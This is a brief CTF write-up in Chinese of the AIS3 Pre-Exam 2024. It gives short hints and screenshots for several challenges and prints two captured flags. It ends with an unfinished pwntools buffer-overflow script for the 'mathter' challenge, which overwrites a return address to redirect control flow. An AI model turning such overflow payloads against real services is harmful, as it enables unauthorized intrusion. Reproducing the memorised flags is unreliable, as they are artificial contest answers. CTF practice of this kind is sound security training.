---
title: AIS3 PreExam2024
tags: 
    - ais3
    - ctf
date: 2024-08-10 22:10:28
---

>總共解出5題 ,167th

## welcome

![image](https://hackmd.io/_uploads/HykIbBeV0.png)

## Quantum Nim Heist

>輸入 00 會跳過
![image](https://hackmd.io/_uploads/S1PFWBxVC.png)
>就可以拿走最後一顆

![image](https://hackmd.io/_uploads/rJ2o-BgNA.png)

## Evil Calculator

![image](https://hackmd.io/_uploads/B1xOupgNR.png)

flag: `AIS3{7RiANG13_5NAK3_I5_50_3Vi1}`

## The Long Print

>把sleep time改短一點 ,但不能是0

![image](https://hackmd.io/_uploads/S1bN32gN0.png)

> flag印完就消失ㄌ
![image](https://hackmd.io/_uploads/HJtmeTx4R.png)

flag: AIS3{You_are_the_master_of_time_management!!!!?}

## Three Dimensional Secret

>通靈題

+ 把封包`G-Code`的部分截下來用線上編輯器看
![image](https://hackmd.io/_uploads/ByJ3u0xVC.png)

## mathter

+ 沒解出來

```python
from pwn import *

r = remote("chals1.ais3.org",50001)

payload = b'y'*12+ p64(0x40199b) + b'a'*8+p64(889275714)
# print(payload)

r.sendlineafter(b':',b'q')
r.sendlineafter(b']',payload)



r.interactive()
```

## result

![image](https://hackmd.io/_uploads/H1pPLbz4C.png)
